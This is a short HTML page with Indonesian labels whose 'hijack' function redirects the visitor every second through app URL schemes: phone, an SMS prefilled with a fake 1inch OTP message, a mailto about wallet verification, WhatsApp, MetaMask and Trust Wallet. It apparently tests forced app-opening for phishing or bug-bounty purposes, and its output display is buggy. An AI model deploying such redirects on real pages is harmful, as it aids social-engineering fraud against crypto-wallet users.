<!DOCTYPE html>
<html>
<body>
<button onclick="hijack()">Test Buka App Lain</button>
<pre id="o"></pre>
<script>
function hijack(){
  let apps = [
    'tel://08123456789',
    'sms://08123456789?body=Kode OTP 1inch kamu: 123456',
    'mailto: support@1inch.io?subject=Verifikasi Wallet',
    'whatsapp://send?text=Halo',
    'metamask://',
    'trust://'
  ];
  let i = 0;
  let out = "";
  setInterval(()=>{
    if(i < apps.length){
      out += "Coba buka: " + apps[i] + "\n";
      window.location.href = apps[i];
      i++;
    }
  }, 1000);
  document.getElementById('o').innerText = out;
}
</script>
</body>
</html>
